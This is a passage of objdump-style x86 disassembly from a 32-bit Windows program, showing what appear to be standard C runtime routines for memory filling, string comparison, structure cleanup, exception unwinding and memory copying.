  427bb5:	pop    ecx
  427bb6:	mov    eax,DWORD PTR [ebp-0x20]
  427bb9:	jmp    0x427c29
  427bbb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bbe:	cmp    ebx,esi
  427bc0:	jne    0x427bc8
  427bc2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bc8:	mov    edi,DWORD PTR [ebp+0x18]
  427bcb:	test   edi,edi
  427bcd:	jne    0x427bd5
  427bcf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bd5:	push   ebx
  427bd6:	call   0x4285cd
  427bdb:	pop    ecx
  427bdc:	cmp    eax,0xffffffff
  427bdf:	jne    0x427be5
  427be1:	xor    eax,eax
  427be3:	jmp    0x427c29
  427be5:	cmp    eax,edi
  427be7:	je     0x427c07
  427be9:	push   0x0
  427beb:	push   0x0
  427bed:	lea    ecx,[ebp+0x10]
  427bf0:	push   ecx
  427bf1:	push   DWORD PTR [ebp+0xc]
  427bf4:	push   eax
  427bf5:	push   edi
  427bf6:	call   0x428616
  427bfb:	add    esp,0x18
  427bfe:	mov    esi,eax
  427c00:	test   esi,esi
  427c02:	je     0x427be1
  427c04:	mov    DWORD PTR [ebp+0xc],esi
  427c07:	push   DWORD PTR [ebp+0x14]
  427c0a:	push   DWORD PTR [ebp+0x10]
  427c0d:	push   DWORD PTR [ebp+0xc]
  427c10:	push   DWORD PTR [ebp+0x8]
  427c13:	push   ebx
  427c14:	call   DWORD PTR ds:0x4290f8
  427c1a:	mov    edi,eax
  427c1c:	test   esi,esi
  427c1e:	je     0x427c27
  427c20:	push   esi
  427c21:	call   0x425f5a
  427c26:	pop    ecx
  427c27:	mov    eax,edi
  427c29:	lea    esp,[ebp-0x38]
  427c2c:	call   0x42538b
  427c31:	ret    
  427c32:	mov    eax,ds:0x45ddc4
  427c37:	test   eax,eax
  427c39:	je     0x427c4a
  427c3b:	push   DWORD PTR [esp+0x4]
  427c3f:	call   eax
  427c41:	test   eax,eax
  427c43:	pop    ecx
  427c44:	je     0x427c4a
  427c46:	xor    eax,eax
  427c48:	inc    eax
  427c49:	ret    
  427c4a:	xor    eax,eax
  427c4c:	ret    
  427c4d:	int3   
  427c4e:	int3   
  427c4f:	int3   
  427c50:	mov    edx,DWORD PTR [esp+0xc]
  427c54:	mov    ecx,DWORD PTR [esp+0x4]
  427c58:	test   edx,edx
  427c5a:	je     0x427cab
  427c5c:	xor    eax,eax
  427c5e:	mov    al,BYTE PTR [esp+0x8]
  427c62:	push   edi
  427c63:	mov    edi,ecx
  427c65:	cmp    edx,0x4
  427c68:	jb     0x427c9b
  427c6a:	neg    ecx
  427c6c:	and    ecx,0x3
  427c6f:	je     0x427c7d
  427c71:	sub    edx,ecx
  427c73:	mov    BYTE PTR [edi],al
  427c75:	add    edi,0x1
  427c78:	sub    ecx,0x1
  427c7b:	jne    0x427c73
  427c7d:	mov    ecx,eax
  427c7f:	shl    eax,0x8
  427c82:	add    eax,ecx
  427c84:	mov    ecx,eax
  427c86:	shl    eax,0x10
  427c89:	add    eax,ecx
  427c8b:	mov    ecx,edx
  427c8d:	and    edx,0x3
  427c90:	shr    ecx,0x2
  427c93:	je     0x427c9b
  427c95:	rep stos DWORD PTR es:[edi],eax
  427c97:	test   edx,edx
  427c99:	je     0x427ca5
  427c9b:	mov    BYTE PTR [edi],al
  427c9d:	add    edi,0x1
  427ca0:	sub    edx,0x1
  427ca3:	jne    0x427c9b
  427ca5:	mov    eax,DWORD PTR [esp+0x8]
  427ca9:	pop    edi
  427caa:	ret    
  427cab:	mov    eax,DWORD PTR [esp+0x4]
  427caf:	ret    
  427cb0:	push   esi
  427cb1:	mov    esi,DWORD PTR [esp+0x8]
  427cb5:	test   esi,esi
  427cb7:	je     0x427e3e
  427cbd:	push   DWORD PTR [esi+0x4]
  427cc0:	call   0x425f5a
  427cc5:	push   DWORD PTR [esi+0x8]
  427cc8:	call   0x425f5a
  427ccd:	push   DWORD PTR [esi+0xc]
  427cd0:	call   0x425f5a
  427cd5:	push   DWORD PTR [esi+0x10]
  427cd8:	call   0x425f5a
  427cdd:	push   DWORD PTR [esi+0x14]
  427ce0:	call   0x425f5a
  427ce5:	push   DWORD PTR [esi+0x18]
  427ce8:	call   0x425f5a
  427ced:	push   DWORD PTR [esi]
  427cef:	call   0x425f5a
  427cf4:	push   DWORD PTR [esi+0x20]
  427cf7:	call   0x425f5a
  427cfc:	push   DWORD PTR [esi+0x24]
  427cff:	call   0x425f5a
  427d04:	push   DWORD PTR [esi+0x28]
  427d07:	call   0x425f5a
  427d0c:	push   DWORD PTR [esi+0x2c]
  427d0f:	call   0x425f5a
  427d14:	push   DWORD PTR [esi+0x30]
  427d17:	call   0x425f5a
  427d1c:	push   DWORD PTR [esi+0x34]
  427d1f:	call   0x425f5a
  427d24:	push   DWORD PTR [esi+0x1c]
  427d27:	call   0x425f5a
  427d2c:	push   DWORD PTR [esi+0x38]
  427d2f:	call   0x425f5a
  427d34:	push   DWORD PTR [esi+0x3c]
  427d37:	call   0x425f5a
  427d3c:	add    esp,0x40
  427d3f:	push   DWORD PTR [esi+0x40]
  427d42:	call   0x425f5a
  427d47:	push   DWORD PTR [esi+0x44]
  427d4a:	call   0x425f5a
  427d4f:	push   DWORD PTR [esi+0x48]
  427d52:	call   0x425f5a
  427d57:	push   DWORD PTR [esi+0x4c]
  427d5a:	call   0x425f5a
  427d5f:	push   DWORD PTR [esi+0x50]
  427d62:	call   0x425f5a
  427d67:	push   DWORD PTR [esi+0x54]
  427d6a:	call   0x425f5a
  427d6f:	push   DWORD PTR [esi+0x58]
  427d72:	call   0x425f5a
  427d77:	push   DWORD PTR [esi+0x5c]
  427d7a:	call   0x425f5a
  427d7f:	push   DWORD PTR [esi+0x60]
  427d82:	call   0x425f5a
  427d87:	push   DWORD PTR [esi+0x64]
  427d8a:	call   0x425f5a
  427d8f:	push   DWORD PTR [esi+0x68]
  427d92:	call   0x425f5a
  427d97:	push   DWORD PTR [esi+0x6c]
  427d9a:	call   0x425f5a
  427d9f:	push   DWORD PTR [esi+0x70]
  427da2:	call   0x425f5a
  427da7:	push   DWORD PTR [esi+0x74]
  427daa:	call   0x425f5a
  427daf:	push   DWORD PTR [esi+0x78]
  427db2:	call   0x425f5a
  427db7:	push   DWORD PTR [esi+0x7c]
  427dba:	call   0x425f5a
  427dbf:	add    esp,0x40
  427dc2:	push   DWORD PTR [esi+0x80]
  427dc8:	call   0x425f5a
  427dcd:	push   DWORD PTR [esi+0x84]
  427dd3:	call   0x425f5a
  427dd8:	push   DWORD PTR [esi+0x88]
  427dde:	call   0x425f5a
  427de3:	push   DWORD PTR [esi+0x8c]
  427de9:	call   0x425f5a
  427dee:	push   DWORD PTR [esi+0x90]
  427df4:	call   0x425f5a
  427df9:	push   DWORD PTR [esi+0x94]
  427dff:	call   0x425f5a
  427e04:	push   DWORD PTR [esi+0x98]
  427e0a:	call   0x425f5a
  427e0f:	push   DWORD PTR [esi+0x9c]
  427e15:	call   0x425f5a
  427e1a:	push   DWORD PTR [esi+0xa0]
  427e20:	call   0x425f5a
  427e25:	push   DWORD PTR [esi+0xa4]
  427e2b:	call   0x425f5a
  427e30:	push   DWORD PTR [esi+0xa8]
  427e36:	call   0x425f5a
  427e3b:	add    esp,0x2c
  427e3e:	pop    esi
  427e3f:	ret    
  427e40:	push   esi
  427e41:	mov    esi,DWORD PTR [esp+0x8]
  427e45:	test   esi,esi
  427e47:	je     0x427e9d
  427e49:	mov    eax,DWORD PTR [esi]
  427e4b:	mov    ecx,DWORD PTR ds:0x45d934
  427e51:	cmp    eax,DWORD PTR [ecx]
  427e53:	je     0x427e64
  427e55:	cmp    eax,DWORD PTR ds:0x45d904
  427e5b:	je     0x427e64
  427e5d:	push   eax
  427e5e:	call   0x425f5a
  427e63:	pop    ecx
  427e64:	mov    eax,DWORD PTR [esi+0x4]
  427e67:	mov    ecx,DWORD PTR ds:0x45d934
  427e6d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e70:	je     0x427e81
  427e72:	cmp    eax,DWORD PTR ds:0x45d908
  427e78:	je     0x427e81
  427e7a:	push   eax
  427e7b:	call   0x425f5a
  427e80:	pop    ecx
  427e81:	mov    esi,DWORD PTR [esi+0x8]
  427e84:	mov    eax,ds:0x45d934
  427e89:	cmp    esi,DWORD PTR [eax+0x8]
  427e8c:	je     0x427e9d
  427e8e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e94:	je     0x427e9d
  427e96:	push   esi
  427e97:	call   0x425f5a
  427e9c:	pop    ecx
  427e9d:	pop    esi
  427e9e:	ret    
  427e9f:	push   esi
  427ea0:	mov    esi,DWORD PTR [esp+0x8]
  427ea4:	test   esi,esi
  427ea6:	je     0x427f76
  427eac:	mov    eax,DWORD PTR [esi+0xc]
  427eaf:	mov    ecx,DWORD PTR ds:0x45d934
  427eb5:	cmp    eax,DWORD PTR [ecx+0xc]
  427eb8:	je     0x427ec9
  427eba:	cmp    eax,DWORD PTR ds:0x45d910
  427ec0:	je     0x427ec9
  427ec2:	push   eax
  427ec3:	call   0x425f5a
  427ec8:	pop    ecx
  427ec9:	mov    eax,DWORD PTR [esi+0x10]
  427ecc:	mov    ecx,DWORD PTR ds:0x45d934
  427ed2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ed5:	je     0x427ee6
  427ed7:	cmp    eax,DWORD PTR ds:0x45d914
  427edd:	je     0x427ee6
  427edf:	push   eax
  427ee0:	call   0x425f5a
  427ee5:	pop    ecx
  427ee6:	mov    eax,DWORD PTR [esi+0x14]
  427ee9:	mov    ecx,DWORD PTR ds:0x45d934
  427eef:	cmp    eax,DWORD PTR [ecx+0x14]
  427ef2:	je     0x427f03
  427ef4:	cmp    eax,DWORD PTR ds:0x45d918
  427efa:	je     0x427f03
  427efc:	push   eax
  427efd:	call   0x425f5a
  427f02:	pop    ecx
  427f03:	mov    eax,DWORD PTR [esi+0x18]
  427f06:	mov    ecx,DWORD PTR ds:0x45d934
  427f0c:	cmp    eax,DWORD PTR [ecx+0x18]
  427f0f:	je     0x427f20
  427f11:	cmp    eax,DWORD PTR ds:0x45d91c
  427f17:	je     0x427f20
  427f19:	push   eax
  427f1a:	call   0x425f5a
  427f1f:	pop    ecx
  427f20:	mov    eax,DWORD PTR [esi+0x1c]
  427f23:	mov    ecx,DWORD PTR ds:0x45d934
  427f29:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f2c:	je     0x427f3d
  427f2e:	cmp    eax,DWORD PTR ds:0x45d920
  427f34:	je     0x427f3d
  427f36:	push   eax
  427f37:	call   0x425f5a
  427f3c:	pop    ecx
  427f3d:	mov    eax,DWORD PTR [esi+0x20]
  427f40:	mov    ecx,DWORD PTR ds:0x45d934
  427f46:	cmp    eax,DWORD PTR [ecx+0x20]
  427f49:	je     0x427f5a
  427f4b:	cmp    eax,DWORD PTR ds:0x45d924
  427f51:	je     0x427f5a
  427f53:	push   eax
  427f54:	call   0x425f5a
  427f59:	pop    ecx
  427f5a:	mov    esi,DWORD PTR [esi+0x24]
  427f5d:	mov    eax,ds:0x45d934
  427f62:	cmp    esi,DWORD PTR [eax+0x24]
  427f65:	je     0x427f76
  427f67:	cmp    esi,DWORD PTR ds:0x45d928
  427f6d:	je     0x427f76
  427f6f:	push   esi
  427f70:	call   0x425f5a
  427f75:	pop    ecx
  427f76:	pop    esi
  427f77:	ret    
  427f78:	int3   
  427f79:	int3   
  427f7a:	int3   
  427f7b:	int3   
  427f7c:	int3   
  427f7d:	int3   
  427f7e:	int3   
  427f7f:	int3   
  427f80:	push   ebp
  427f81:	mov    ebp,esp
  427f83:	push   esi
  427f84:	xor    eax,eax
  427f86:	push   eax
  427f87:	push   eax
  427f88:	push   eax
  427f89:	push   eax
  427f8a:	push   eax
  427f8b:	push   eax
  427f8c:	push   eax
  427f8d:	push   eax
  427f8e:	mov    edx,DWORD PTR [ebp+0xc]
  427f91:	lea    ecx,[ecx+0x0]
  427f94:	mov    al,BYTE PTR [edx]
  427f96:	or     al,al
  427f98:	je     0x427fa3
  427f9a:	add    edx,0x1
  427f9d:	bts    DWORD PTR [esp],eax
  427fa1:	jmp    0x427f94
  427fa3:	mov    esi,DWORD PTR [ebp+0x8]
  427fa6:	or     ecx,0xffffffff
  427fa9:	lea    ecx,[ecx+0x0]
  427fac:	add    ecx,0x1
  427faf:	mov    al,BYTE PTR [esi]
  427fb1:	or     al,al
  427fb3:	je     0x427fbe
  427fb5:	add    esi,0x1
  427fb8:	bt     DWORD PTR [esp],eax
  427fbc:	jae    0x427fac
  427fbe:	mov    eax,ecx
  427fc0:	add    esp,0x20
  427fc3:	pop    esi
  427fc4:	leave  
  427fc5:	ret    
  427fc6:	int3   
  427fc7:	int3   
  427fc8:	int3   
  427fc9:	int3   
  427fca:	int3   
  427fcb:	int3   
  427fcc:	int3   
  427fcd:	int3   
  427fce:	int3   
  427fcf:	int3   
  427fd0:	mov    edx,DWORD PTR [esp+0x4]
  427fd4:	mov    ecx,DWORD PTR [esp+0x8]
  427fd8:	test   edx,0x3
  427fde:	jne    0x42801c
  427fe0:	mov    eax,DWORD PTR [edx]
  427fe2:	cmp    al,BYTE PTR [ecx]
  427fe4:	jne    0x428014
  427fe6:	or     al,al
  427fe8:	je     0x428010
  427fea:	cmp    ah,BYTE PTR [ecx+0x1]
  427fed:	jne    0x428014
  427fef:	or     ah,ah
  427ff1:	je     0x428010
  427ff3:	shr    eax,0x10
  427ff6:	cmp    al,BYTE PTR [ecx+0x2]
  427ff9:	jne    0x428014
  427ffb:	or     al,al
  427ffd:	je     0x428010
  427fff:	cmp    ah,BYTE PTR [ecx+0x3]
  428002:	jne    0x428014
  428004:	add    ecx,0x4
  428007:	add    edx,0x4
  42800a:	or     ah,ah
  42800c:	jne    0x427fe0
  42800e:	mov    edi,edi
  428010:	xor    eax,eax
  428012:	ret    
  428013:	nop
  428014:	sbb    eax,eax
  428016:	shl    eax,1
  428018:	add    eax,0x1
  42801b:	ret    
  42801c:	test   edx,0x1
  428022:	je     0x42803c
  428024:	mov    al,BYTE PTR [edx]
  428026:	add    edx,0x1
  428029:	cmp    al,BYTE PTR [ecx]
  42802b:	jne    0x428014
  42802d:	add    ecx,0x1
  428030:	or     al,al
  428032:	je     0x428010
  428034:	test   edx,0x2
  42803a:	je     0x427fe0
  42803c:	mov    ax,WORD PTR [edx]
  42803f:	add    edx,0x2
  428042:	cmp    al,BYTE PTR [ecx]
  428044:	jne    0x428014
  428046:	or     al,al
  428048:	je     0x428010
  42804a:	cmp    ah,BYTE PTR [ecx+0x1]
  42804d:	jne    0x428014
  42804f:	or     ah,ah
  428051:	je     0x428010
  428053:	add    ecx,0x2
  428056:	jmp    0x427fe0
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	mov    eax,DWORD PTR [esp+0xc]
  428064:	test   eax,eax
  428066:	je     0x4280b2
  428068:	mov    edx,DWORD PTR [esp+0x4]
  42806c:	push   esi
  42806d:	push   edi
  42806e:	mov    esi,edx
  428070:	mov    edi,DWORD PTR [esp+0x10]
  428074:	or     edx,edi
  428076:	and    edx,0x3
  428079:	je     0x4280b3
  42807b:	test   eax,0x1
  428080:	je     0x428093
  428082:	mov    cl,BYTE PTR [esi]
  428084:	cmp    cl,BYTE PTR [edi]
  428086:	jne    0x4280e0
  428088:	add    esi,0x1
  42808b:	add    edi,0x1
  42808e:	sub    eax,0x1
  428091:	je     0x4280b0
  428093:	mov    cl,BYTE PTR [esi]
  428095:	mov    dl,BYTE PTR [edi]
  428097:	cmp    cl,dl
  428099:	jne    0x4280e0
  42809b:	mov    cl,BYTE PTR [esi+0x1]
  42809e:	mov    dl,BYTE PTR [edi+0x1]
  4280a1:	cmp    cl,dl
  4280a3:	jne    0x4280e0
  4280a5:	add    edi,0x2
  4280a8:	add    esi,0x2
  4280ab:	sub    eax,0x2
  4280ae:	jne    0x428093
  4280b0:	pop    edi
  4280b1:	pop    esi
  4280b2:	ret    
  4280b3:	mov    ecx,eax
  4280b5:	and    eax,0x3
  4280b8:	shr    ecx,0x2
  4280bb:	je     0x4280e8
  4280bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280bf:	je     0x4280e8
  4280c1:	mov    ecx,DWORD PTR [esi-0x4]
  4280c4:	mov    edx,DWORD PTR [edi-0x4]
  4280c7:	cmp    cl,dl
  4280c9:	jne    0x4280db
  4280cb:	cmp    ch,dh
  4280cd:	jne    0x4280db
  4280cf:	shr    ecx,0x10
  4280d2:	shr    edx,0x10
  4280d5:	cmp    cl,dl
  4280d7:	jne    0x4280db
  4280d9:	cmp    ch,dh
  4280db:	mov    eax,0x0
  4280e0:	sbb    eax,eax
  4280e2:	pop    edi
  4280e3:	sbb    eax,0xffffffff
  4280e6:	pop    esi
  4280e7:	ret    
  4280e8:	test   eax,eax
  4280ea:	je     0x4280b0
  4280ec:	mov    edx,DWORD PTR [esi]
  4280ee:	mov    ecx,DWORD PTR [edi]
  4280f0:	cmp    dl,cl
  4280f2:	jne    0x4280db
  4280f4:	sub    eax,0x1
  4280f7:	je     0x428115
  4280f9:	cmp    dh,ch
  4280fb:	jne    0x4280db
  4280fd:	sub    eax,0x1
  428100:	je     0x428115
  428102:	and    ecx,0xff0000
  428108:	and    edx,0xff0000
  42810e:	cmp    edx,ecx
  428110:	jne    0x4280db
  428112:	sub    eax,0x1
  428115:	pop    edi
  428116:	pop    esi
  428117:	ret    
  428118:	int3   
  428119:	int3   
  42811a:	int3   
  42811b:	int3   
  42811c:	int3   
  42811d:	int3   
  42811e:	int3   
  42811f:	int3   
  428120:	push   ebp
  428121:	mov    ebp,esp
  428123:	push   edi
  428124:	push   esi
  428125:	push   ebx
  428126:	mov    ecx,DWORD PTR [ebp+0x10]
  428129:	jecxz  0x428152
  42812b:	mov    ebx,ecx
  42812d:	mov    edi,DWORD PTR [ebp+0x8]
  428130:	mov    esi,edi
  428132:	xor    eax,eax
  428134:	repnz scas al,BYTE PTR es:[edi]
  428136:	neg    ecx
  428138:	add    ecx,ebx
  42813a:	mov    edi,esi
  42813c:	mov    esi,DWORD PTR [ebp+0xc]
  42813f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	mov    al,BYTE PTR [esi-0x1]
  428144:	xor    ecx,ecx
  428146:	cmp    al,BYTE PTR [edi-0x1]
  428149:	ja     0x428150
  42814b:	je     0x428152
  42814d:	sub    ecx,0x2
  428150:	not    ecx
  428152:	mov    eax,ecx
  428154:	pop    ebx
  428155:	pop    esi
  428156:	pop    edi
  428157:	leave  
  428158:	ret    
  428159:	int3   
  42815a:	int3   
  42815b:	int3   
  42815c:	int3   
  42815d:	int3   
  42815e:	int3   
  42815f:	int3   
  428160:	push   ebp
  428161:	mov    ebp,esp
  428163:	push   esi
  428164:	xor    eax,eax
  428166:	push   eax
  428167:	push   eax
  428168:	push   eax
  428169:	push   eax
  42816a:	push   eax
  42816b:	push   eax
  42816c:	push   eax
  42816d:	push   eax
  42816e:	mov    edx,DWORD PTR [ebp+0xc]
  428171:	lea    ecx,[ecx+0x0]
  428174:	mov    al,BYTE PTR [edx]
  428176:	or     al,al
  428178:	je     0x428183
  42817a:	add    edx,0x1
  42817d:	bts    DWORD PTR [esp],eax
  428181:	jmp    0x428174
  428183:	mov    esi,DWORD PTR [ebp+0x8]
  428186:	mov    edi,edi
  428188:	mov    al,BYTE PTR [esi]
  42818a:	or     al,al
  42818c:	je     0x42819a
  42818e:	add    esi,0x1
  428191:	bt     DWORD PTR [esp],eax
  428195:	jae    0x428188
  428197:	lea    eax,[esi-0x1]
  42819a:	add    esp,0x20
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ebx
  4281a4:	push   esi
  4281a5:	push   edi
  4281a6:	push   ebp
  4281a7:	push   0x0
  4281a9:	push   0x0
  4281ab:	push   0x4281b8
  4281b0:	push   DWORD PTR [ebp+0x8]
  4281b3:	call   0x428c2e
  4281b8:	pop    ebp
  4281b9:	pop    edi
  4281ba:	pop    esi
  4281bb:	pop    ebx
  4281bc:	mov    esp,ebp
  4281be:	pop    ebp
  4281bf:	ret    
  4281c0:	mov    ecx,DWORD PTR [esp+0x4]
  4281c4:	test   DWORD PTR [ecx+0x4],0x6
  4281cb:	mov    eax,0x1
  4281d0:	je     0x4281e1
  4281d2:	mov    eax,DWORD PTR [esp+0x8]
  4281d6:	mov    edx,DWORD PTR [esp+0x10]
  4281da:	mov    DWORD PTR [edx],eax
  4281dc:	mov    eax,0x3
  4281e1:	ret    
  4281e2:	push   ebx
  4281e3:	push   esi
  4281e4:	push   edi
  4281e5:	mov    eax,DWORD PTR [esp+0x10]
  4281e9:	push   eax
  4281ea:	push   0xfffffffe
  4281ec:	push   0x4281c0
  4281f1:	push   DWORD PTR fs:0x0
  4281f8:	mov    DWORD PTR fs:0x0,esp
  4281ff:	mov    eax,DWORD PTR [esp+0x20]
  428203:	mov    ebx,DWORD PTR [eax+0x8]
  428206:	mov    esi,DWORD PTR [eax+0xc]
  428209:	cmp    esi,0xffffffff
  42820c:	je     0x42823c
  42820e:	cmp    esi,DWORD PTR [esp+0x24]
  428212:	je     0x42823c
  428214:	lea    esi,[esi+esi*2]
  428217:	mov    ecx,DWORD PTR [ebx+esi*4]
  42821a:	mov    DWORD PTR [esp+0x8],ecx
  42821e:	mov    DWORD PTR [eax+0xc],ecx
  428221:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428226:	jne    0x42823a
  428228:	push   0x101
  42822d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428231:	call   0x428276
  428236:	call   DWORD PTR [ebx+esi*4+0x8]
  42823a:	jmp    0x4281ff
  42823c:	pop    DWORD PTR fs:0x0
  428243:	add    esp,0xc
  428246:	pop    edi
  428247:	pop    esi
  428248:	pop    ebx
  428249:	ret    
  42824a:	xor    eax,eax
  42824c:	mov    ecx,DWORD PTR fs:0x0
  428253:	cmp    DWORD PTR [ecx+0x4],0x4281c0
  42825a:	jne    0x42826c
  42825c:	mov    edx,DWORD PTR [ecx+0xc]
  42825f:	mov    edx,DWORD PTR [edx+0xc]
  428262:	cmp    DWORD PTR [ecx+0x8],edx
  428265:	jne    0x42826c
  428267:	mov    eax,0x1
  42826c:	ret    
  42826d:	push   ebx
  42826e:	push   ecx
  42826f:	mov    ebx,0x45d94c
  428274:	jmp    0x428280
  428276:	push   ebx
  428277:	push   ecx
  428278:	mov    ebx,0x45d94c
  42827d:	mov    ecx,DWORD PTR [ebp+0x8]
  428280:	mov    DWORD PTR [ebx+0x8],ecx
  428283:	mov    DWORD PTR [ebx+0x4],eax
  428286:	mov    DWORD PTR [ebx+0xc],ebp
  428289:	pop    ecx
  42828a:	pop    ebx
  42828b:	ret    0x4
  42828e:	int3   
  42828f:	int3   
  428290:	push   ebp
  428291:	mov    ebp,esp
  428293:	push   edi
  428294:	push   esi
  428295:	mov    esi,DWORD PTR [ebp+0xc]
  428298:	mov    ecx,DWORD PTR [ebp+0x10]
  42829b:	mov    edi,DWORD PTR [ebp+0x8]
  42829e:	mov    eax,ecx
  4282a0:	mov    edx,ecx
  4282a2:	add    eax,esi
  4282a4:	cmp    edi,esi
  4282a6:	jbe    0x4282b0
  4282a8:	cmp    edi,eax
  4282aa:	jb     0x42842c
  4282b0:	test   edi,0x3
  4282b6:	jne    0x4282cc
  4282b8:	shr    ecx,0x2
  4282bb:	and    edx,0x3
  4282be:	cmp    ecx,0x8
  4282c1:	jb     0x4282ec
  4282c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282c5:	jmp    DWORD PTR [edx*4+0x4283dc]
  4282cc:	mov    eax,edi
  4282ce:	mov    edx,0x3
  4282d3:	sub    ecx,0x4
  4282d6:	jb     0x4282e4
  4282d8:	and    eax,0x3
  4282db:	add    ecx,eax
  4282dd:	jmp    DWORD PTR [eax*4+0x4282f0]
  4282e4:	jmp    DWORD PTR [ecx*4+0x4283ec]
  4282eb:	nop
  4282ec:	jmp    DWORD PTR [ecx*4+0x428370]
  4282f3:	nop
  4282f4:	add    BYTE PTR [ebx-0x7cd3ffbe],al
  4282fa:	inc    edx
  4282fb:	add    BYTE PTR [eax-0x7d],dl
  4282fe:	inc    edx
  4282ff:	add    BYTE PTR [ebx],ah
  428301:	ror    DWORD PTR [edx-0x75f877fa],1
  428307:	inc    esi
  428308:	add    DWORD PTR [eax+0x468a0147],ecx
  42830e:	add    al,cl
  428310:	jmp    0x28a0b17
  428315:	add    esi,0x3
  428318:	add    edi,0x3
  42831b:	cmp    ecx,0x8
  42831e:	jb     0x4282ec
  428320:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428322:	jmp    DWORD PTR [edx*4+0x4283dc]
  428329:	lea    ecx,[ecx+0x0]
  42832c:	and    edx,ecx
  42832e:	mov    al,BYTE PTR [esi]
  428330:	mov    BYTE PTR [edi],al
  428332:	mov    al,BYTE PTR [esi+0x1]
  428335:	shr    ecx,0x2
  428338:	mov    BYTE PTR [edi+0x1],al
  42833b:	add    esi,0x2
  42833e:	add    edi,0x2
  428341:	cmp    ecx,0x8
  428344:	jb     0x4282ec
  428346:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428348:	jmp    DWORD PTR [edx*4+0x4283dc]
  42834f:	nop
  428350:	and    edx,ecx
  428352:	mov    al,BYTE PTR [esi]
  428354:	mov    BYTE PTR [edi],al
  428356:	add    esi,0x1
  428359:	shr    ecx,0x2
  42835c:	add    edi,0x1
  42835f:	cmp    ecx,0x8
  428362:	jb     0x4282ec
  428364:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428366:	jmp    DWORD PTR [edx*4+0x4283dc]
  42836d:	lea    ecx,[ecx+0x0]
  428370:	rol    DWORD PTR [ebx-0x7c3fffbe],cl
  428376:	inc    edx
  428377:	add    BYTE PTR [eax-0x4fffbd7d],bh
  42837d:	add    DWORD PTR [edx+0x0],0xffffffa8
  428381:	add    DWORD PTR [edx+0x0],0xffffffa0
  428385:	add    DWORD PTR [edx+0x0],0xffffff98
  428389:	add    DWORD PTR [edx+0x0],0xffffff90
  42838d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428391:	inc    esp
  428392:	mov    fs,esp
  428394:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283c8:	lea    eax,[ecx*4+0x0]
  4283cf:	add    esi,eax
  4283d1:	add    edi,eax
  4283d3:	jmp    DWORD PTR [edx*4+0x4283dc]
  4283da:	mov    edi,edi
  4283dc:	in     al,dx
  4283dd:	add    DWORD PTR [edx+0x0],0xfffffff4
  4283e1:	add    DWORD PTR [edx+0x0],0x0
  4283e5:	test   BYTE PTR [edx+0x0],al
  4283e8:	adc    al,0x84
  4283ea:	inc    edx
  4283eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4283f1:	leave  
  4283f2:	ret    
  4283f3:	nop
  4283f4:	mov    al,BYTE PTR [esi]
  4283f6:	mov    BYTE PTR [edi],al
  4283f8:	mov    eax,DWORD PTR [ebp+0x8]
  4283fb:	pop    esi
  4283fc:	pop    edi
  4283fd:	leave  
  4283fe:	ret    
  4283ff:	nop
  428400:	mov    al,BYTE PTR [esi]
  428402:	mov    BYTE PTR [edi],al
  428404:	mov    al,BYTE PTR [esi+0x1]
  428407:	mov    BYTE PTR [edi+0x1],al
  42840a:	mov    eax,DWORD PTR [ebp+0x8]
  42840d:	pop    esi
  42840e:	pop    edi
  42840f:	leave  
  428410:	ret    
  428411:	lea    ecx,[ecx+0x0]
  428414:	mov    al,BYTE PTR [esi]
  428416:	mov    BYTE PTR [edi],al
  428418:	mov    al,BYTE PTR [esi+0x1]
  42841b:	mov    BYTE PTR [edi+0x1],al
  42841e:	mov    al,BYTE PTR [esi+0x2]
  428421:	mov    BYTE PTR [edi+0x2],al
  428424:	mov    eax,DWORD PTR [ebp+0x8]
  428427:	pop    esi
  428428:	pop    edi
  428429:	leave  
  42842a:	ret    
  42842b:	nop
  42842c:	lea    esi,[ecx+esi*1-0x4]
  428430:	lea    edi,[ecx+edi*1-0x4]
  428434:	test   edi,0x3
  42843a:	jne    0x428460
  42843c:	shr    ecx,0x2
  42843f:	and    edx,0x3
  428442:	cmp    ecx,0x8
  428445:	jb     0x428454
  428447:	std    
  428448:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42844a:	cld    
  42844b:	jmp    DWORD PTR [edx*4+0x428578]
  428452:	mov    edi,edi
  428454:	neg    ecx
  428456:	jmp    DWORD PTR [ecx*4+0x428528]
  42845d:	lea    ecx,[ecx+0x0]
  428460:	mov    eax,edi
  428462:	mov    edx,0x3
  428467:	cmp    ecx,0x4
  42846a:	jb     0x428478
  42846c:	and    eax,0x3
  42846f:	sub    ecx,eax
